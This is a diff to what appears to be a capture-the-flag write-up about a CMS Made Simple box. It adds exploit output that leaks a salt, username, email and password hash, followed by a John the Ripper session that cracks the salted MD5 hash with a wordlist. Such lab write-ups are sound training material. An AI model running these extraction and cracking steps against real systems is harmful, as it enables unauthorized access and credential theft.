@@ -124,4 +124,24 @@ So we figure out by visiting this url that there is an webapp named CMS Made Sim
 
 In googling the version, we found that this is vulnerable to a RCE (https://www.exploit-db.com/exploits/46635)
 
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[*] Try: 0c01f4468bd75d7a84c7eb73846e8d96
 
+```
+$ cat hashmd5 
+0c01f4468bd75d7a84c7eb73846e8d96$1dac0d92e9fa6bb2
+```
+
+```
+$ john hashmd5 --wordlist=/usr/share/wordlists/rockyou.txt --form=dynamic='md5($s.$p)'
+Using default input encoding: UTF-8
+Loaded 1 password hash (dynamic=md5($s.$p) [128/128 ASIMD 4x2])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+secret           (?)     
+1g 0:00:00:00 DONE (2023-08-18 15:26) 100.0g/s 168000p/s 168000c/s 168000C/s 123456..kenny
+Use the "--show --format=dynamic=md5($s.$p)" options to display all of the cracked passwords reliably
+Session completed.
+```
